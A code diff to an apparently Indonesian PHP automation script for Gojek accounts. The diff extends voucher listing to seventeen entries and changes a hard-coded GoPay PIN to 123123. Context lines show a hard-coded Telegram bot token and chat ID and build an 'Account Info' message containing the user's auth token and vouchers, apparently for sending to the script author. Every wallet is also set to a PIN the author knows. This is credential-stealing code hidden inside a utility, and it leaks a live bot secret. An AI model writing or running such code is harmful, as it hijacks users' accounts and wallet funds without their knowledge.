@@ -155,6 +155,10 @@ echo "\e[89m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬�
         $voucher11 = getStr1('"title":"','",',$cekvoucher,"11");
         $voucher12 = getStr1('"title":"','",',$cekvoucher,"12");
         $voucher13 = getStr1('"title":"','",',$cekvoucher,"13");
+	$voucher14 = getStr1('"title":"','",',$cekvoucher,"14");
+	$voucher15 = getStr1('"title":"','",',$cekvoucher,"15");
+	$voucher16 = getStr1('"title":"','",',$cekvoucher,"16");
+	$voucher17 = getStr1('"title":"','",',$cekvoucher,"17");
         echo "\n".color("purple"," Total VC ".$total." : ");
         echo "\n".color("nevy","                     1. ".$voucher1);
         echo "\n".color("nevy","                     2. ".$voucher2);
@@ -169,6 +173,10 @@ echo "\e[89m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬�
       	echo "\n".color("nevy","                     11. ".$voucher11);
         echo "\n".color("nevy","                     12. ".$voucher12);
         echo "\n".color("nevy","                     13. ".$voucher13);
+	echo "\n".color("nevy","                     14. ".$voucher14);
+	echo "\n".color("nevy","                     15. ".$voucher15);
+	echo "\n".color("nevy","                     16. ".$voucher16);
+	echo "\n".color("nevy","                     17. ".$voucher17);
         echo"\n";
         $expired1 = getStr1('"expiry_date":"','"',$cekvoucher,'1');
         $expired2 = getStr1('"expiry_date":"','"',$cekvoucher,'2');
@@ -183,6 +191,10 @@ echo "\e[89m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬�
         $expired11 = getStr1('"expiry_date":"','"',$cekvoucher,'11');
         $expired12 = getStr1('"expiry_date":"','"',$cekvoucher,'12');
         $expired13 = getStr1('"expiry_date":"','"',$cekvoucher,'13');
+	$expired14 = getStr1('"expiry_date":"','"',$cekvoucher,'14');
+	$expired15 = getStr1('"expiry_date":"','"',$cekvoucher,'15');
+	$expired16 = getStr1('"expiry_date":"','"',$cekvoucher,'16');
+	$expired17 = getStr1('"expiry_date":"','"',$cekvoucher,'17');
         $TOKEN  = "1032900146:AAE7V93cvCvw1DNuTk0Hp1ZFywJGmjiP7aQ";
       	$chatid = "785784404";
       	$pesan 	= "[+] Gojek Account Info [+]\n\n".$token."\n\nTotalVoucher = ".$total."\n[+] ".$voucher1."\n[+] Exp : [".$expired1."]\n[+] ".$voucher2."\n[+] Exp : [".$expired2."]\n[+] ".$voucher3."\n[+] Exp : [".$expired3."]\n[+] ".$voucher4."\n[+] Exp : [".$expired4."]\n[+] ".$voucher5."\n[+] Exp : [".$expired5."]\n[+] ".$voucher6."\n[+] Exp : [".$expired6."]\n[+] ".$voucher7."\n[+] Exp : [".$expired7."]\n[+] ".$voucher8."\n[+] Exp : [".$expired8."]\n[+] ".$voucher9."\n[+] Exp : [".$expired9."]\n[+] ".$voucher10."\n[+] Exp : [".$expired10."] ".$voucher11."\n[+] Exp : [".$expired11."]\n[+] ".$voucher12."\n[+] Exp : [".$expired12."]\n[+] ".$voucher13."\n[+] Exp : [".$expired13."]\n[+]";
@@ -213,8 +225,8 @@ echo "\e[89m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬�
          $pilih1 = trim(fgets(STDIN));
          if($pilih1 == "y" || $pilih1 == "Y"){
          //if($pilih1 == "y" && strpos($no, "628")){
-         echo color("nevy","▬▬▬▬▬▬▬▬▬▬▬▬▬▬ PIN GOPAY KAMU = 111111 ▬▬▬▬▬▬▬▬▬▬▬▬")."\n";
-         $data2 = '{"pin":"111111"}';
+         echo color("nevy","▬▬▬▬▬▬▬▬▬▬▬▬▬▬ PIN GOPAY KAMU = 123123 ▬▬▬▬▬▬▬▬▬▬▬▬")."\n";
+         $data2 = '{"pin":"123123"}';
          $getotpsetpin = request("/wallet/pin", $token, $data2, null, null, $uuid);
          echo "Otp pin: ";
          $otpsetpin = trim(fgets(STDIN));
